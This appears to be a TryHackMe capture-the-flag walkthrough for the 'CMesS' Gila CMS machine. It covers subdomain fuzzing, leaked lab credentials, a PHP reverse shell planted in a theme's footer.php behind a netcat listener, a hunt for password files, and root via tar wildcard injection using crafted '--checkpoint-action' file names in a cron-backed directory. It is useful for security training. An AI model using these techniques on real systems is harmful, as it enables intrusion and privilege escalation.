# [CMesS](https://tryhackme.com/room/cmess)

## Can you root this Gila CMS box?

# Flags

## Please also note that this box does not require brute forcing!

### Compromise this machine and obtain user.txt

_Have you tried fuzzing for subdomains?_

1. Fuzz for subdomains to discover hidden services
   - Add the discovered `dev` to `/etc/hosts`

```bash
wfuzz -c -w /root/Tools/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm -H "Host: FUZZ.cmess.thm" -hw 290
```

> Use `--hh 290` to hide responses with the common HTML size of 290 bytes, which filters out invalid subdomains

![SCREEN01](https://github.com/user-attachments/assets/c19a8947-e046-4e4f-a222-506e31920a93)

![SCREEN02](https://github.com/user-attachments/assets/52284dde-4bd1-474b-ab8e-2e3fb5144c30)

2. In `http://dev.cmess.thm/`, we find a development log containing credentials
   - The credentials are `andre@cmess.thm:KPFTN_f2yxe%`

![SCREEN03](https://github.com/user-attachments/assets/b3b8f884-a360-49c8-b118-7046b90ac945)

3. Use the credentials to log in to `http://cmess.thm/admin`

4. To gain a shell on the target system, set up a netcat listener on our attacking machine

```bash
nc -lvnp 4444
```

5. Add [PHP Reverse Shell Payload](https://github.com/mosec0/Reverse-Shell/blob/main/reverse-shell.php) somwhere, for example in `http://cmess.thm/admin/fm?f=themes/gila-blog/footer.php`. Refresh the main page of the blog to get the shell

![SCREEN04](https://github.com/user-attachments/assets/83ec0ce3-67e8-4b55-9aca-f13981cfb37b)

![SCREEN05](https://github.com/user-attachments/assets/cfb615ee-ea5a-4307-9e09-6c3614fefdab)

6. Once the connection is established, upgrade the shell for better functionality

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

7. Search for password files that might help with lateral movement
   - The password is **UQfsdCB7aAP6**

```bash
find / -type f -name "*password*" 2>/dev/null
cat /opt/.password.bak
```

![SCREEN06](https://github.com/user-attachments/assets/b2175c38-d1a3-45f5-bd47-c8fcb32b21a9)

8. Switch to the `andre` user and retrieve the user flag

```bash
su andre
cat /home/andre/user.txt
```

![SCREEN07](https://github.com/user-attachments/assets/c8efcc94-c2ee-4dcc-b24d-d962fbf183f2)

---

# Escalate your privileges and obtain root.txt

1. Examine the home directory for clues. The note in `/home/andre/backup/note` provides valuable information. The note suggests there's a scheduled backup job running with elevated privileges

```bash
cat /home/andre/backup/note
```

![SCREEN08](https://github.com/user-attachments/assets/7b56e6cd-636b-472b-b466-aa4c9f71c2c7)

2. Check the system's scheduled tasks. There is a TAR wildcard vulnerability in a root cronjob that runs every 2 minutes. The job is backing up the `/home/andre/backup` directory using tar. Create an exploit that uses tar's checkpoint feature to execute arbitrary commands

```bash
cat /etc/crontab

echo 'cp /root/root.txt /home/andre/root.txt && chmod 777 /home/andre/root.txt' > /home/andre/backup/runme.sh
chmod +x /home/andre/backup/runme.sh
touch "/home/andre/backup/--checkpoint=1"
touch "/home/andre/backup/--checkpoint-action=exec=sh runme.sh"
```

![SCREEN09](https://github.com/user-attachments/assets/f7d74dd1-64f8-4213-881e-8a99b2dffd34)

3. Wait for the cron job to execute (within 2 minutes), then retrieve the root flag

```bash
ls /home/andre
cat /home/andre/root.txt
```

![SCREEN10](https://github.com/user-attachments/assets/7bd76bc5-c517-4540-bfd6-c406dbf0835c)
